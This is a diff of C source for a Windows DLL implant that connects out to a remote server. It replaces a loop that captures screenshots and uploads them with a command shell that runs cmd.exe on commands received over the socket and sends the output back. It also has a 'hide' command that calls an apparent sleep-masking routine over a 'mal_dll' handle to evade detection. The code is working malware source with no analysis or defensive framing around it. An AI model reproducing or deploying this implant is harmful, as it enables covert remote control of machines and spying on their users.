@@ -705,66 +705,151 @@ static BOOL custom_process_attach(HMODULE hModule)
 	
 	global_functions_t global_functions = { 0 };
 
-	if (!load_winsock_functions(&global_functions.ws_funcs))
+	if (!load_winsock_functions(&global_functions.ws2))
 	{
 		return FALSE;
 	}
 
-	if (!load_kernel32_functions(&global_functions.krnl_funcs))
+	if (!load_kernel32_functions(&global_functions.kernel32))
 	{
 		return FALSE;
 	}
 
-	if (!load_user32_functions(&global_functions.user32_funcs))
+	if (!load_user32_functions(&global_functions.user32))
 	{
 		return FALSE;
 	}
 	
-	if (!load_gdi32_functions(&global_functions.gdi32_funcs))
+	if (!load_gdi32_functions(&global_functions.gdi32))
 	{
 		return FALSE;
 	}
 
 
 	
-	SOCKET socket = connect_to_server(&global_functions.ws_funcs, &global_functions.krnl_funcs);
+	SOCKET socket = connect_to_server(&global_functions.ws2, &global_functions.kernel32);
 
-	do
+	HANDLE hChildStd_OUT_Rd = NULL;
+	HANDLE hChildStd_OUT_Wr = NULL;
+	HANDLE hChildStd_IN_Rd = NULL;
+	HANDLE hChildStd_IN_Wr = NULL;
+
+	// 创建输出管道
+	if (!CreatePipeWithSecurity(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr)) {
+		//printf("CreatePipe failed\n");
+		return FALSE;
+	}
+
+	// 创建输入管道
+	if (!CreatePipeWithSecurity(&hChildStd_IN_Rd, &hChildStd_IN_Wr)) {
+		//printf("CreatePipe failed\n");
+		return FALSE;
+	}
+
+	SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
+	SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
+
+	char cmd[] = "cmd.exe";
+
+	if (CreateChildProcessWithRedirect(
+		cmd,
+		hChildStd_IN_Rd,
+		hChildStd_OUT_Wr,
+		hChildStd_OUT_Wr
+	)) 
 	{
-		char* filename = create_temp_filename("screenshot", &global_functions.krnl_funcs);
-		my_strncat(filename, ".bmp", 4);
+		CloseHandle(hChildStd_IN_Rd);
+		CloseHandle(hChildStd_OUT_Wr);
 
-		
-		status = capture_screenshot_win32(filename, &global_functions.krnl_funcs, &global_functions.user32_funcs, &global_functions.gdi32_funcs);
 
-		//int* buggy = NULL;
-		//*buggy = 0xAAAAAAAA;
+		char input[MAX_NAME_LEN];
+		char stdout_buf[BUFSIZE];
+		//char end_signal[16] = "^^^c2cctt**^^^";
 
-		status = send_file_over_socket(socket, filename, &global_functions.ws_funcs, &global_functions.krnl_funcs);
-
-		if (status != 0)
-		{
-			// reconnect
+		while (ReadFromPipe(hChildStd_OUT_Rd, stdout_buf, BUFSIZE) > 0) {
+			break;
 		}
 
-		cleanup_temp_file(filename, &global_functions.krnl_funcs);
+		my_memset(input, 0, MAX_NAME_LEN);
+		my_memset(stdout_buf, 0, BUFSIZE);
 
-		if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
+		while (1)
 		{
-			return FALSE;
+			if (recv_data(socket, input, MAX_NAME_LEN, &global_functions.ws2, &global_functions.kernel32) != 0)
+			{
+				break;
+			}
+
+			if (!my_strcmp(input, "hide"))
+			{
+				if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
+				{
+					break;
+				}
+
+				continue;
+			}
+
+			WriteToPipe(hChildStd_IN_Wr, input);
+			while (ReadFromPipe(hChildStd_OUT_Rd, stdout_buf, BUFSIZE) > 0)
+			{
+
+				//int* buggy = NULL;
+				//*buggy = 0xAAAAAAAA;
+
+				if (send_data(socket, stdout_buf, BUFSIZE, &global_functions.ws2, &global_functions.kernel32) != 0);
+					break;
+			}
+
+			//if (send_data(socket, end_signal, 16, &global_functions.ws2, &global_functions.kernel32) != 0);
+			//	break;
+
+			if (!my_strcmp(input, "exit"))
+			{
+				break;
+			}
+
 		}
 
-	} while (true);
+
+	}
 
 	//do
 	//{
-	//	MessageBoxA(NULL, "Ciallo～(∠ · ω< )⌒☆", "Ciallo～(∠ · ω< )⌒☆", MB_ICONERROR);
+	//	char* filename = create_temp_filename("screenshot", &global_functions.kernel32);
+	//	my_strncat(filename, ".bmp", 4);
+
+	//	
+	//	status = capture_screenshot_win32(filename, &global_functions.kernel32, &global_functions.user32, &global_functions.gdi32);
+
+	//	//int* buggy = NULL;
+	//	//*buggy = 0xAAAAAAAA;
+
+	//	status = send_file(socket, filename, &global_functions.ws2, &global_functions.kernel32);
+
+	//	if (status != 0)
+	//	{
+	//		// reconnect
+	//	}
+
+	//	cleanup_temp_file(filename, &global_functions.kernel32);
+
 	//	if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
 	//	{
-	//		MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
 	//		return FALSE;
 	//	}
+
 	//} while (true);
+
+	do
+	{
+		//MessageBoxA(NULL, "Ciallo～(∠ · ω< )⌒☆", "Ciallo～(∠ · ω< )⌒☆", MB_ICONERROR);
+		if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
+		{
+			//MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
+			return FALSE;
+		}
+	} while (true);
 
 	return TRUE;
 }
